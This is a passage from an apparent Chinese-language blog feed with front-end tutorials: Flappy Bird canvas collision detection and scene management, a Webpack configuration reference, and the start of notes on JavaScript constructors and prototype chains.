javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">game.<span class="property">bird</span>.<span class="property">x</span>;</span><br><span class="line">game.<span class="property">bord</span>.<span class="property">y</span></span><br></pre></td></tr></table></figure></li></ul><p>因为鸟只有一个，用管子去检查鸟非常方便，所有碰撞检测是管子的方法，管子每一帧都要检测自己是不是撞到鸟了。使用AABB盒来进行碰撞检测，就是一个矩形的包围盒。 </p><blockquote><p>AABB盒： AABB盒，一个3D的AABB就是一个简单的六面体，每一边都平行于一个坐标平面，矩形边界框不一定都是立方体，它的长、宽、高可以彼此不同。坐标轴平行（Axially-aligned）不仅指盒体与世界坐标轴平行，同时也指盒体的每个面都和一条坐标轴垂直，这样一个基本信息就能减少转换盒体时操作的次数。AABB技术在当今的许多游戏中都得到了应用，开发者经常用它们作为模型的检测模型。但是，提高精度的同时也会降低速度。 </p></blockquote><p>对小鸟和管子进行碰撞检测，分表需要考虑到小鸟的三个边与管子的三个边之间的关系，分为以下两种情况：</p><ol><li>小鸟与上管子碰撞时</li></ol><p><img src="http://img.cdn.esunr.xyz/markdown/20190513150421.png" alt="20190513150421.png"></p><ol><li>小鸟与下管子碰撞时</li></ol><p><img src="http://img.cdn.esunr.xyz/markdown/20190513150827.png" alt="20190513150827.png"></p><p>其中，将相同项合并之后，得出只要满足如下结果，就说名小鸟与管子发生碰撞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">鸟.R &gt; 上管.L 且</span><br><span class="line">鸟.L &lt; 上管.R 且</span><br><span class="line">鸟.T &lt; 上管.B 或 鸟.B〉下管.T</span><br></pre></td></tr></table></figure><p>再分析管子 LBRT 的各个值：对于管子来说，管子L就是 <code>this.x</code> ，管子R就是 <code>this.x + 52</code> ，上管子B就是 <code>this.height</code> ，下管子T就是<code>this.height + this.kaikou</code> 。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190513152915.png" alt="20190513152915.png"></p><p>最终我们总结出如下规则：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (game.<span class="property">bird</span>.<span class="property">R</span> &gt; <span class="variable language_">this</span>.<span class="property">x</span> &amp;&amp; game.<span class="property">bird</span>.<span class="property">L</span> &lt; <span class="variable language_">this</span>.<span class="property">x</span> + <span class="number">52</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (game.<span class="property">bird</span>.<span class="property">T</span> &lt; <span class="variable language_">this</span>.<span class="property">height</span> || game.<span class="property">bird</span>.<span class="property">B</span> &gt; <span class="variable language_">this</span>.<span class="property">height</span> + <span class="variable language_">this</span>.<span class="property">kaikou</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;BOOM!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="计数器处理"><a href="#计数器处理" class="headerlink" title="计数器处理"></a>计数器处理</h1><p>对不同位数字要进行不同的处理，处理方式如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190513171916.png" alt="20190513171916.png"></p><p>在 Game 类的主循环中添加：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scoreLength = <span class="variable language_">this</span>.<span class="property">score</span>.<span class="title function_">toString</span>().<span class="property">length</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; scoreLength; i++) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ctx</span>.<span class="title function_">drawImage</span>(<span class="variable language_">this</span>.<span class="property">R</span>[<span class="string">&#x27;shuzi&#x27;</span> + <span class="variable language_">this</span>.<span class="property">score</span>.<span class="title function_">toString</span>().<span class="title function_">charAt</span>(i)], <span class="variable language_">this</span>.<span class="property">canvas</span>.<span class="property">width</span> / <span class="number">2</span> + <span class="number">32</span> * (i - scoreLength / <span class="number">2</span>), <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当小鸟通过管子后，需要让 Game 类上挂载的 <code>score</code> +1 ，之后再利用函数节流的思想，在 Pipe 类上定义一个 <code>alreadPass</code> 用来判断是否让 <code>score</code> 进行增加操作，在 Pipe 类的 <code>update</code> 函数中加入如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果小鸟通过管子就加分</span></span><br><span class="line"><span class="keyword">if</span>(game.<span class="property">bird</span>.<span class="property">L</span> &gt; <span class="variable language_">this</span>.<span class="property">x</span> + <span class="number">52</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">alreadPass</span>)&#123;</span><br><span class="line">  game.<span class="property">score</span> ++ ;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">alreadPass</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="场景管理器"><a href="#场景管理器" class="headerlink" title="场景管理器"></a>场景管理器</h1><p>FlappyBird中有三个场景：欢迎界面、游戏界面、Gameover界面。</p><p>三个场景的业务、逻辑、监听完全不一样。</p><p>所以我们可以用场景管理器来负责管理自己当前场景的演员的更新和渲染。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190513194730.png" alt="场景管理器"></p><p>Game类说起，此时Game不要负责渲染背景、小鸟、大地、管子了。而是仅仅负责渲染、更新场景管理器。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// 游戏主循环</span><br><span class="line">  this.timmer = setInterval(() =&gt; &#123;</span><br><span class="line">    // 清屏</span><br><span class="line">    this.ctx.clearRect(0, 0, this.canvas.height, this.canvas.width);</span><br><span class="line"></span><br><span class="line"><span class="deletion">-   // 渲染、更新所有的演员和渲染所有的演员</span></span><br><span class="line"><span class="deletion">-   _.each(this.actors, function (actor) &#123;</span></span><br><span class="line"><span class="deletion">-     actor.update();</span></span><br><span class="line"><span class="deletion">-     actor.render();</span></span><br><span class="line"><span class="deletion">-   &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-   // 每40帧渲染一组管子</span></span><br><span class="line"><span class="deletion">-   if (this.f % 100 == 0) &#123;</span></span><br><span class="line"><span class="deletion">-     this.pipe = new Pipe();</span></span><br><span class="line"><span class="deletion">-   &#125;</span></span><br><span class="line"><span class="deletion">-   </span></span><br><span class="line"><span class="deletion">-   // 打印分数</span></span><br><span class="line"><span class="deletion">-   var scoreLength = this.score.toString().length;</span></span><br><span class="line"><span class="deletion">-   for (var i = 0; i &lt; scoreLength; i++) &#123;</span></span><br><span class="line"><span class="deletion">-      this.ctx.drawImage(this.R[&#x27;shuzi&#x27; + this.score.toString().charAt(i)], this.canvas.width / 2 + 32 * (i - scoreLength /-2), 100);</span></span><br><span class="line"><span class="deletion">-   &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+   // 场景管理器的渲染</span></span><br><span class="line"><span class="addition">+   this.sm.update();</span></span><br><span class="line"><span class="addition">+   this.sm.render();</span></span><br><span class="line"></span><br><span class="line">    // 打印帧编号</span><br><span class="line">    this.printFix();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  &#125;, 20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景管理器有三个方法 <code>enter()</code> 、 <code>update()</code> 、 <code>render()</code> 。其中定时器在每帧执行 <code>update()</code> 方法和 <code>render()</code> 方法。</p><p>使用 <code>enter()</code> 方法由业务来调动：</p><ul><li>场景1：进入游戏，玩家可以点击开始菜单</li><li>场景2：准备开始游戏，向玩家展示游戏教程</li><li>场景3：开始游戏，玩家操作小鸟游玩</li><li>场景4：小鸟死亡，开始掉落，播放死亡动画</li><li>场景5：显示“Game Over”文字提示，用户点击界面可重新返回场景1</li></ul>]]></content>
      
      
      <categories>
          
          <category> 项目实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
            <tag> 项目实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack快速配置参考</title>
      <link href="/2019/05/c46947605fd8.html"/>
      <url>/2019/05/c46947605fd8.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装与设置项目目录结构"><a href="#1-安装与设置项目目录结构" class="headerlink" title="1. 安装与设置项目目录结构"></a>1. 安装与设置项目目录结构</h1><p>安装基础的webpack组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir webpack-demo </span><br><span class="line">cd webpack-demo</span><br><span class="line">npm init -y</span><br><span class="line">npm install webpack webpack-cli --save-dev</span><br></pre></td></tr></table></figure><p>常用目录参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">webpack-demo </span><br><span class="line">|- /node_modelues</span><br><span class="line">|- /dist（存放最终输出的文件）</span><br><span class="line">|- /asset（存放HTML模板以及favoicon）</span><br><span class="line">   |- index.html</span><br><span class="line">|- /src（存放源码）</span><br><span class="line">   |- index.js（入口文件）</span><br><span class="line">   |- /js</span><br><span class="line">   |- /css</span><br><span class="line">   |- /img</span><br><span class="line">|- package.json</span><br><span class="line">|- package-lock.json</span><br><span class="line">|- webpack.common.js（webpack通用配置项）</span><br><span class="line">|- webpack.dev.js（webpack开发环境配置项）</span><br><span class="line">|- webpack.prod.js（webpack生产环境配置项）</span><br></pre></td></tr></table></figure><h1 id="2-安装开发环境依赖"><a href="#2-安装开发环境依赖" class="headerlink" title="2. 安装开发环境依赖"></a>2. 安装开发环境依赖</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install clean-webpack-plugin html-webpack-plugin webpack-dev-server webpack-merge -D</span><br><span class="line"></span><br><span class="line">npm install sass-loader node-sass style-loader css-loader file-loader -D</span><br></pre></td></tr></table></figure><p>简单介绍：</p><ul><li>clean-webpack-plugin： 用于每次编译代码时，自动清除目录中的dist文件夹</li><li>html-webpack-plugin：与 clean-webpack-plugin 配合使用，可以自动生成 dist 中的 html 文件，并且通过配置可以自动导入 webpack config 中的所有 entry 文件。</li><li>file-loader：文件加载器</li><li>webpack-dev-server：webpack 开发环境服务器</li><li>webpack-merge：自动合并 webpack config 的生产环境配置和开发环境配置</li></ul><h1 id="3-具体配置"><a href="#3-具体配置" class="headerlink" title="3. 具体配置"></a>3. 具体配置</h1><h2 id="3-1-package-json文件"><a href="#3-1-package-json文件" class="headerlink" title="3.1 package.json文件"></a>3.1 package.json文件</h2><p>在 package.json 文件下编写 <code>scripts</code>，来快捷在 npm 环境下运行 webpack 指令：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app-name&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;private&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack --config webpack.prod.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server --open --config webpack.dev.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ... ...</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ... ...</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-webpack-config文件"><a href="#3-2-webpack-config文件" class="headerlink" title="3.2 webpack config文件"></a>3.2 webpack config文件</h2><p>使用 webpack config 多环境配置文件，可以让 webpack 在不同的编译状态下实施相对应的编译模式，如：</p><ul><li>在 <code>npm run dev</code> 模式下执行的是 <code>webpack.common.js</code> + <code>webpack.dev.js</code> 的设置；</li><li>在 <code>npm run build</code> 模式下执行的是 <code>webpack.common.js</code> + <code>webpack.dev.js</code> 的设置。</li></ul><p>合并配置文件依赖于 <code>webpack-merge</code> 插件</p><h3 id="webpack-common-js"><a href="#webpack-common-js" class="headerlink" title="webpack.common.js"></a>webpack.common.js</h3><p>webpack 的基础配置文件，将开发环境和生产环境的配置同样的项目写在该文件下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">CleanWebpackPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;clean-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&#x27;bundle.js&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">CleanWebpackPlugin</span>(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;Title&#x27;</span>,</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&#x27;./asset/index.html&#x27;</span> <span class="comment">// HtmlWebpackPlugin 自动生成 HTML 文件的模板</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.<span class="title class_">HotModuleReplacementPlugin</span>()</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// 图片加载器</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.(png|svg|jpg|gif)$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [&#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">          <span class="attr">options</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;[hash].[ext]&#x27;</span>, <span class="comment">// 将图片以哈希值命名，如果需要使用原名则将 [hash] 改为 [name]</span></span><br><span class="line">            <span class="attr">outputPath</span>: <span class="string">&#x27;images&#x27;</span> <span class="comment">// 将读取的图片放置在 dist/images/ 目录下</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// css加载器</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// scss加载器</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.scss$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">            <span class="string">&quot;style-loader&quot;</span>,</span><br><span class="line">            <span class="string">&quot;css-loader&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sass-loader&quot;</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="webpack-dev-js"><a href="#webpack-dev-js" class="headerlink" title="webpack.dev.js"></a>webpack.dev.js</h3><p>开发环境配置，主要配置热更新以及源代码映射：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> common = <span class="built_in">require</span>(<span class="string">&#x27;./webpack.common.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">merge</span>(common, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>,</span><br><span class="line">  <span class="attr">devtool</span>: <span class="string">&#x27;inline-source-map&#x27;</span>,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">contentBase</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">    <span class="attr">hot</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="webpack-prod-js"><a href="#webpack-prod-js" class="headerlink" title="webpack.prod.js"></a>webpack.prod.js</h3><p>生产环境配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> common = <span class="built_in">require</span>(<span class="string">&#x27;./webpack.common.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">merge</span>(common, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;production&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="4-编译"><a href="#4-编译" class="headerlink" title="4. 编译"></a>4. 编译</h1><p>运行开发模式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p>运行构建模式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于构造函数和原型链运行机制的试题与知识点</title>
      <link href="/2019/05/9cb8ab68fd27.html"/>
      <url>/2019/05/9cb8ab68fd27.html</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul><li>如何准确判断一个变量是数组类型</li><li>写一个原型链继承的例子</li><li>描述new一个对象的过程</li><li>zepto（或其他框架）源码中如何使用原型链</li></ul><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="1-构造函数"><a href="#1-构造函数" class="headerlink" title="1. 构造函数"></a>1. 构造函数</h2><ul><li>构造函数要用大写字母开头</li><li>var a=其实是var a=new Object）的语法糖</li><li>var a=[]其实是var a=new Array）的语法糖</li><li>function Foo）{..}其实是var Foo=new Function（.）</li><li>使用instanceof 可以判断一个函数是否是一个变量的构造函数</li></ul><p><img src="http://markdown.img.esunr.xyz/a71efaafly1g2rc6awjmxj20mf0dzwhx.jpg" alt="a71efaafly1g2rc6awjmxj20mf0dzwhx.jpg"></p><h2 id="2-原型规则和示例"><a href="#2-原型规则和示例" class="headerlink" title="2. 原型规则和示例"></a>2. 原型规则和示例</h2><ul><li>所有的引用类型（数组、对象、函数），都具有对象特性，即可自由扩展属性（除了“null”意外）</li><li>所有的<strong>引用类型</strong>（数组、对象、函数），都有一个<strong>proto</strong>（隐式原型）属性，属性值是一个普通的对象</li><li>所有的<strong>函数</strong>，都有一个prototype（显式原型）属性，属性值也是一个普通的对象</li><li>所有的引用类型（数组、对象、函数），_proto_属性值指向它的构造函数的”prototype”属性值</li></ul><p><img src="http://markdown.img.esunr.xyz/a71efaafly1g2rchgklygj20mg0e4dk5.jpg" alt="a71efaafly1g2rchgklygj20mg0e4dk5.jpg"></p><ul><li><p>当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的<strong>proto</strong>（即它的构造函数的prototype）中寻找。</p><p>我们在一个构造函数的显式原型上去定义方法可以有效的减少内存占用，因为如果我们定义在构造函数内部，则每实例化一个对象，就会开辟一个堆内存去存放挂载到其实例上，然而对于方法的调用这是没有必要的</p></li></ul><p><strong>关于 prototype 它有以下几个要点，务必牢记：</strong></p><ol><li>每一个函数（类）都有原型属性，称作prototype，这个属性提供了可供当前类的实例调用的属性和方法。</li><li>浏览器默认给原型开辟的堆内存中有一个constructor属性，这个属性存放的是函数本身</li><li>每一个对象<del>的实例上</del>都有一个<strong>proto</strong>属性称为原型链，这个属性指向当前类的所属原型，不确定的原型都指向Object.prototype，然而Object的<strong>proto</strong>指向null</li></ol><blockquote><p>prototype下的name属性指函数名，length属性指传入的形参的个数</p></blockquote><p><img src="http://markdown.img.esunr.xyz/a71efaafly1g2rcm3gp5cj20me0e377t.jpg" alt="a71efaafly1g2rcm3gp5cj20me0e377t.jpg"></p><p>利用 <code>for in</code> 循环可以来获取对象身上自己定义的属性而不获取来自原型的属性</p><p><img src="http://markdown.img.esunr.xyz/a71efaafly1g2rcrpqiwvj20mk0e0tbu.jpg" alt="a71efaafly1g2rcrpqiwvj20mk0e0tbu.jpg"></p><h2 id="3-原型链"><a href="#3-原型链" class="headerlink" title="3. 原型链"></a>3. 原型链</h2><p>当一个方法在原型上没有时，就会查找原型链</p><p><img src="http://markdown.img.esunr.xyz/a71efaafly1g2rcwekrs7j20mj0du0vy.jpg" alt="a71efaafly1g2rcwekrs7j20mj0du0vy.jpg"><br><img src="http://markdown.img.esunr.xyz/a71efaafly1g2rd0r86dzj20mm0drmyo.jpg" alt="a71efaafly1g2rd0r86dzj20mm0drmyo.jpg"></p><h2 id="4-intanceof"><a href="#4-intanceof" class="headerlink" title="4. intanceof"></a>4. intanceof</h2><p>intanceof 用于判断 <strong>引用类型</strong> 属于哪个 <strong>构造函数</strong> 的方法。</p><p>finstanceofFoo的判断逻辑是：</p><ol><li>f的<strong>proto</strong>一层一层往上，能否对应到Foo.prototype，只要 <code>f.__proto__ == Foo.prototype</code> 就验证通过 </li><li>再试着判断 f instanceof Object</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Foo2</span>(<span class="params"></span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="string">&#x27;蔡徐坤&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 让Foo2的prototype指向Foo的prototype，这时候，Foo2与Foo的prototype可以看作为一个对象，也就是说修改Foo的prototype相当于修改Foo1的prototype，反之亦然</span></span><br><span class="line"><span class="title class_">Foo2</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">age</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line"><span class="title class_">Foo2</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hobbies</span> = <span class="string">&#x27;唱、跳、篮球、Rap&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由下可以看出Foo2与Foo的prototype指向同一个对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// Foo &#123; age: &#x27;unknown&#x27;, hobbies: &#x27;唱、跳、篮球、Rap&#x27; &#125;</span></span><br><span class="line"><span class="variable 